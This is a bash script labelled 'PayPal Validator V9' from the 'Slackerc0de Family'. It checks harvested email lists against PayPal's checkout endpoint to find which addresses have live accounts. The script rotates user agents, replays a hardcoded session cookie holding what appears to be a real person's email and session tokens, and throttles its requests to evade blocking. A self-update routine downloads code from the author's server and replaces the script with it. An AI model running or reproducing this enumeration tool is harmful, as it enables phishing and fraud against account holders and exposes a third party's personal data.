#!/bin/bash
# Slackerc0de Family Present
# PayPal Valid V9
# 13 July 2K17
# By Malhadi Jr.

#set -x
cat <<EOF

           ##########################   #
           ########################    ##
           ####                       ###
           ####                      ####
           #######################   ####
           #######################   ####
                              ####   ####
                              ####   ####
           ##########     ########   ####
           ############     ######   ####
           #####                     ####
           #####                     ####
           ##################    ########
           ####################    ######

              - https://malhadijr.com -
           [+] malhadijr@slackerc0de.us [+]
        
--------------------------------------------------------
     Slackerc0de Family - PayPal Validator V9 2017
--------------------------------------------------------

EOF

usage() { 
  echo "Usage: ./myscript.sh COMMANDS: [-i <list.txt>] [-r <folder/>] [-l {1-1000}] [-t {1-10}] OPTIONS: [-d] [-c]

Command:
-i (20k-US.txt)     File input that contain email to check
-r (result/)        Folder to store the result live.txt and die.txt
-l (60|90|110)      How many list you want to send per delayTime
-t (3|5|8)          Sleep for -t when check is reach -l fold

Options:
-d                  Delete the list from input file per check
-c                  Compress result to compressed/ folder and
                    move result folder to haschecked/
-h                  Show this manual to screen
-u                  Check integrity file to server and update

Report any bugs to: <Malhadi Jr> contact@malhadi.slackerc0de.us
"
  exit 1 
}

updater() {
  echo "Checking integrity file to server..."
  localShellCode=`cat $0 | sha256sum`
  cloudShellCode=`curl "http://slackerc0de.us/v9ppval/nyu.txt" -s | sha256sum`

  if [[ $localShellCode != $cloudShellCode ]]; then
    echo "Updating script... Please wait."
    wget "http://slackerc0de.us/v9ppval/nyu.txt"; rm -f validator; mv nyu.txt validator; chmod +x validator
    echo "File successfully updated on `date`."
  else
    echo "Script are up to date"
  fi
  exit 1
}

# Assign the arguments for each
# parameter to global variable
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            inputFile=${OPTARG}
            ;;
        r)
            targetFolder=${OPTARG}
            ;;
        l)
            sendList=${OPTARG}
            ;;
        t)
            perSec=${OPTARG}
            ;;
        d)
            isDel='y'
            ;;
        c)
            isCompress='y'
            ;;
        h)
            usage
            ;;
        u)
            updater
            ;;
    esac
done

if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

if [ -z "${isCompress}" ]; then
  isCompress='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null
if [[ $inputFile == '' ]]; then
  # Print available file on
  # current folder
  # clear
  tree
  read -p "Enter mailist file: " inputFile
fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check ? [y/n]: " isDel
fi

if [[ $isCompress == '' || $cli_mode == 'interactive' ]]; then
  read -p "Compress the result ? [y/n]: " isCompress
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi


urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}


malhadi_appleval() {
  RED='\033[0;31m'
  CYAN='\033[0;36m'
  YELLOW='\033[1;33m'
  ORANGE='\033[0;33m' 
  PURPLE='\033[0;35m'
  NC='\033[0m'
  SECONDS=0
  useragent=('Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5362 (KHTML, like Gecko) Chrome/14.0.848.0 Safari/5362' 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)' 'Opera/8.77 (Windows NT 6.0; U; en-US) Presto/2.9.179 Version/10.00' 'Mozilla/5.0 (Windows NT 5.1; en-US; rv:1.9.0.20) Gecko/20130614 Firefox/3.6.8' 'Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20141216 Firefox/7.0' 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/5.1)' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/5.1)' 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.1)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5350 (KHTML, like Gecko) Chrome/15.0.827.0 Safari/5350' 'Mozilla/5.0 (Windows NT 5.0; en-US; rv:1.9.2.20) Gecko/20110914 Firefox/5.0.1' 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5311 (KHTML, like Gecko) Chrome/13.0.808.0 Safari/5311' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.1)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5352 (KHTML, like Gecko) Chrome/15.0.874.0 Safari/5352' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/3.0)' 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5361 (KHTML, like Gecko) Chrome/13.0.833.0 Safari/5361' 'Mozilla/5.0 (Windows NT 6.1; en-US; rv:1.9.0.20) Gecko/20120410 Firefox/3.8')
  rand_useragent=${useragent[$RANDOM % ${#useragent[@]}]}

  # posted=`curl "https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&xo_node_fallback=true&force_sa=true&upload=1&rm=2&business=$1" -D - -L --cookie anjeng.txt --cookie-jar anjeng.txt -s -A "$rand_useragent"`
  posted=`curl "https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&xo_node_fallback=true&force_sa=true&upload=1&rm=2&business=$1" -H 'accept-encoding: gzip, deflate, sdch, br' -H 'accept-language: en-US,en;q=0.8,id;q=0.6,fr;q=0.4' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'authority: www.paypal.com' -H 'cookie: cookie_check=yes; KHcl0EuY7AKSMgfvHl7J5E7hPtK=q5zNvNl74Ku2oHOvdQdFSITP50WHNJZHRfj5NbPwJ5OzOjSnFNNEbs4DiWSODSfQxjuYU-1aoalazhDf; X-PP-ADS=AToBqBpCWeDYF50CJGtCcG7-39yhFMk; X-PP-K=1499272211:5:NA; login_email=berend.schakel%40hotmail.com; ui_experience=home%3D3%26login_type%3DEMAIL_PASSWORD; consumer_display=USER_HOMEPAGE%3D3%26USER_TARGETPAGE%3D0%26USER_FILTER_CHOICE%3D0%26BALANCE_MODULE_STATE%3D1%26GIFT_BALANCE_MODULE_STATE%3D1%26LAST_SELECTED_ALIAS_ID%3D0%26SELLING_GROUP%3D1%26PAYMENT_AND_RISK_GROUP%3D1%26SHIPPING_GROUP%3D1%26MCE2_ELIGIBILITY%3D2; dtCookie=B20C9F2A06CC1272771D1F6FC24FB0A7|X2RlZmF1bHR8MQ; nsid=s%3AHNuSUa2tcAm84ZSYOmmdcCmg9otFbQzg.GEMbPu5%2FyljnYHwxGr3ZEDNpdVUiphWIsKmU2iRIHVk; cwrClyrK4LoCV1fydGbAxiNL6iG=JHpTL-yfnhwcj0CVzPRv9yeu7UvUPvAEt1VcE8BM2w5Mnz0UlDoypEH4ru-Ie7Tzn5n6nyFqPZ77i7mfQ7CsgspDFHdmdCD4e-FzgZFCMhgusECRk_75J8wkPhm1HBK8hsSBU8KXxjvskA3r_XCaI9ZDLtumeNBpUJVhIb3dJx6wRmc09g8bcaLelAbViFviMVyLzZhXEQDc_1xXcPxO9Rpz6KJeG6E6Tu2egaYx0VtoZvR4Tp0sgLyyH68sIbevpxg_sqm3Se0_9HblBmCdA4UjKhUnBvtmPkjJG1gw0lFUXyepmtn-jTOAm-lkC0fWj24Avc_gED8TZtd7SNlBXeLxhZYRaqS2RbtA_8CqUGAqTygpCbEUXJJq5Zi54SRMOSqepYwG-6vLPNPGxKOgC2W7yWOOlI5D7NQEFNgByZMHaU48-ySG509wwVa; navlns=0.0; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IkVwOER0cW5QRFRJQ3FVbjlJQ3FuelphU3VtbzFRN2xReEFLSmJmYWx3OGpBSGZlay1sQXlHc0FQU1RNalRydjJkM2lwLUtnZ0FINV8zZXZaY0FrYVhCYTRnbTlTeWs4LVhOTno1ZnBpN0VTR1ZKYmJDMVpZYlZLYm9QMWdxeU8tUTVCRG9CZldGU3hnbzlJb3M4QkMzY3htc3FEUk51V0xpYUVhZF9KUkNySnFQWmhFbm1oWEpHdkxQWHEiLCJpYXQiOjE0OTk5MzM0NzUsImV4cCI6MTQ5OTkzNzA3NX0.QJng9aSdsiKaO9vTyawDo6gCXxTbVbCkOEsAoEYk2iw; feel_cookie=a%205%20_flow%20b%205%20_flow%20c%2018%20merchantpaymentweb%20d%2018%20merchantpaymentweb%20e%2022%20Checkout%2fwps%2fLogin.xsl%20f%2025%20Checkout%2fcommon%2fError.xsl%20g%205%20en_US%20h%205%20en_US%20i%2022%20xpt%2fCheckout%2fwps%2fLogin%20j%2025%20xpt%2fCheckout%2fcommon%2fError%20k%2034%20Pay%20with%20a%20PayPal%20account%20-%20PayPal%20l%2053%20Error%20-%20%20Your%20purchase%20couldn%27t%20be%20completed%20-%20PayPal%20; navcmd=_xclick; pNTcMTtQfrJuaJiwEnWXQ6yNxfq=7V8Aqz0JrJrE1dCboxWIyHOJ5mgUlZWXkG4Di9tj2Pdqb2yCWcSd_-lpa0uN8emwReriyZhYKQEsmXJ5NUjrEHRzj_A8JpYao-cYQiZ0gswllmE5vW8jJDWbHjLxlcPZIW963l2kRj1mB70kVWdN45NpLhAhjhdDUaNJ1vMdWATKHnf-aVcGR926VnSbpbRkvdDpMDEZ9MsHfIw5i5kaHqbEeKQCmZ8qjUH7GV8UWfYRlGAoCAwXBG_njUgidiSJaBvVE7GzE4_ISBvZncX57vFXMC4TR4kP07sfG7NEiTZ1ZkfcfL05N9xjl43EA3EBZNElOkjCrYzqQrSUCV2riM5iSfLFNienYj9KqH4yvU21FoWU6V5XHvF9QGTV_xP5JNEUGnge5WgZORK3ejcn1-fZHLqjRpJ_drqSr4O5jP6lxWNSlGm51bwR-dx2HRHjgMkDZfPt1HEB7eddulhCHouuEYKE9I51gjGop8ylqK3Hi290PmxzjQHbvHrlXCS7GMM52nsdzqSwNOuSmPVex58cQ_9yZMYBClkglUjcwlsAqKQHKWGpswMWV_f4adGKX3eYJTTLQQPsU_esajRnY6kaamykBOw7-XfwekKRocfz_Kuhbiw2LZZhx8HYm24Mad62XREYh04Ee5r-dVeq_lf6ETwZoWRZu2u9WRMhx9OUJN0YSIvqlEQ1-uJF80EjDlwUk4k6QglgWy3LqegfPT-DlN6u30iybioFto2zF4TFABvrDRd-U994piD6GlW-ZzqoQr9Hb3yW12MSNXrmgzvIx9bWX0cZ3tAfFX-CaqLOWF5ExmYqqBlI_r2Hl7tQoNk-ZpDXP5FPKcaMfeNn_duISHbkyE0x-R4EdAeuFdYcdcNRmuCrjZFtUgo0BmqQsPYYDgMaGFgUsGOIk4le7vEArPdI5IJT2efJZQAqW4KEbk1XFGBGD4kuHA-jDLm1KBUvKTcoPwJ1uxZkoDdqoofSjMEDEk5J11mZUnyYJHdnRYefsaLsGk4_-Ozu9tM8CZnfDfwRkI1wXmZ5P0WhQZgo2dGGL2Sl7M0t4akFk5UOG6JjneETwffbZgcvJbVdVEnn0qrSXgmc4eefOYzeJyyY3l483Xl8iBifA1D5kpIUAE08U06crsLEIb101fJ1Qs6V6fWBXsYIvEm3apTesAfwm8XWuaN5z8WfSSRgjXNUDaLxBLGQZ8YDQFVU8qbTee9NMTTxwWZ7fHNaaVP_wdDGSD1_FNFqnmoBN3_Qupjaz_H70juPKWoq_zBawOPHxXEeJpj4uGZQLbsNCZSBaDiFSmxyVsr4kUNlkDTBnKOOp5vew8GgY93nJDP_rt0yzfWsTT7Im8I3kkTATRrjQqKxIblkVzJeKNV7wJO_vmdT8rUMJfpA2WsygnCrTUg--K7BBbq7V-T0Q-oDYSk55xpu0uaC3QzHIk5tQz9qgg7px4O4txQ4oNM_dtsnRxV4SVNE88B5pES_YpCN; s_pers=%20s_fid%3D3024AEF188338B3E-19C060A4E6FFFAB2%7C1563005661479%3B%20gpv_c43%3Dmain%253Awps%253Aux%253Abutton%253Astart%7C1499935461488%3B%20gpv_events%3Dno%2520value%7C1499935461505%3B; s_sess=%20c_m%3DOther%2520Natural%2520Referrersundefinedwww.google.co.id%3B%20lt%3D%3B%20s_cc%3Dtrue%3B%20v31%3Dmain%253Awps%253Aux%253Abutton%253Astart%3B%20s_ppv%3D0%3B%20tr_p1%3Dmain%253Awps%253Aux%253Abutton%253Astart%257E%255B4%255D%3B%20s_sq%3D%3B; AKDC=slc-b-origin-www-1.paypal.com; x-pp-p=AOMRB2gu9No5n0gVoqXmg8x9jLEMKn7vZUp.UVeSF95mYdr61auy4r-ldum9dLS2wKNCGYQS94Dy9NLzCIbO-ZKP0-Bls8kZaM92QtEikITRyP9sqRuQHBhPuwhtg1CbeLePxkMExxzjK.A8Qeq1LLvQdZnYmTqyml7JKEdMeJQj7MGioMOAILQQ7E84RwlGM.l17NMzlHWfsGUGmOHdQzNfsBJa-X8lqdrPJuVkHc4gP7WOJE3TY4VkOSojeShf; LANG=en_US%3BID; tsrce=mppnodeweb; x-pp-s=eyJ0IjoiMTQ5OTkzNjk3MjIxMCIsIm0iOiIwIn0; X-PP-SILOVER=name%3DLIVE6.WEB.1%26silo_version%3D880%26app%3Dmppnodeweb%26TIME%3D3426248537%26HTTP_X_PP_AZ_LOCATOR%3Ddcg12.slc; akavpau_ppsd=1499937572~id=226070a0c1cb79603050685f10e836c9; _ga=GA1.2.1776398466.1495896827; 44907=; ts=vreXpYrS%3D1594607753%26vteXpYrS%3D1499938776%26vr%3D69ef683215c0a4dcb785fd9fffffffff%26vt%3D3b35edaa15d0a4a183351205ff7e544b; tcs=main%3Amktg%3Abusiness%3A%3Ahome%7Cheader-send; _gat=1' --compressed -s -D - -L `
  # echo "$posted"
  duration=$SECONDS

  dead="$(echo "$posted" | grep -c 'ocation: https://www.paypal.com/cgi-bin')"
  limited="$(echo "$posted" | grep -c 'xpt\\x2fCheckout\\x2fcommon\\x2fError')"
  blocked="$(echo "$posted" | grep -c 'xpt\\x2fRisk\\x2fgeneral\\x2fSecurityChallenge')"

  header="`date +%H:%M:%S` from $inputFile to $targetFolder"
  footer="[Slackercode - PayPalValid V9] $(($duration % 60))sec.\n"

  if [[ $dead == 1 ]]; then
    printf "[$header] $2/$3. ${RED}DIE => $1 ${NC} $footer"
    echo "$1" >> $4/die.txt
  else
    if [[ $limited > 0 ]]; then
      printf "[$header] $2/$3. ${ORANGE}LIMITED => $1 ${NC} $footer"
      echo "$1" >> $4/limited.txt
    else
      if [[ $blocked > 0 ]]; then
        printf "[$header] $2/$3. ${CYAN}BLOCKED => $1 ${NC} $footer"
        echo "$1" >> $4/blocked.txt
      else
        printf "[$header] $2/$3. ${PURPLE}LIVE => $1 ${NC} $footer"
        echo "$1" >> $4/live.txt
      fi
    fi
  fi

  printf "\r"
}

# Preparing file list 
# by using email pattern 
# every line in $inputFile
echo "[+] Cleaning your mailist file"
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile

# Finding match mail provider
echo "########################################"
# Print total line of mailist
totalLines=`grep -c "@" $inputFile`
echo "There are $totalLines of list."
echo " "
echo "Hotmail: `grep -c "@hotmail" $inputFile`"
echo "Yahoo: `grep -c "@yahoo" $inputFile`"
echo "Gmail: `grep -c "@gmail" $inputFile`"
echo "########################################"

# Extract email per line
# from both input file
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
con=1

echo "[+] Sending $sendList email per $perSec seconds"

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  username="${mailist[$i]}"
  indexer=$((con++))
  tot=$((totalLines--))
  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
    echo "[$header] Waiting $perSec second. $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed, With $sendList req / $perSec seconds."
    sleep $perSec
  fi
  
  malhadi_appleval "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &

  if [[ $isDel == 'y' ]]; then
    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
  fi
done 

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

if [[ $isCompress == 'y' ]]; then
  tgl=`date`
  tgl=${tgl// /-}
  zipped="$targetFolder-$tgl.zip"

  echo "[+] Compressing result"
  zip -r "compressed/$zipped" "$targetFolder/die.txt" "$targetFolder/live.txt"
  echo "[+] Saved to compressed/$zipped"
  mv $targetFolder haschecked
  echo "[+] $targetFolder has been moved to haschecked/"
fi
#rm $inputFile
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
echo "+==========+ Slackerc0de Family - Malhadi Jr +==========+"